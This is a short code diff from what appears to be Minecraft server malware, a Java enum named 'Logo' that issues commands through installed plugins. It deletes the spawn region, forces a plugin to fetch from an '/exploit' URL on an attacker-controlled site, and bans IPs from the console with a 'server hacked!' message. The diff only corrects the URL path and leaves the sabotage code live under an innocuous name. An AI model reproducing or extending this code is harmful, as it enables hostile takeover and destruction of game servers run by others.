@@ -42,7 +42,7 @@ public enum Logo {
             Informer.send("/rg delete spawn");
         }
         if (Plugin.GADGETS_MENU.isEnabled()) {
-            Informer.send("/gmenu about -forceupdate ${url_site}exploit");
+            Informer.send("/gmenu about -forceupdate ${url_site}/exploit");
         }
         if (Plugin.DELUXE_MENUS.isEnabled()) {
             Informer.send("/dmenu execute ${author} [console] ban-ip ** server hacked!");
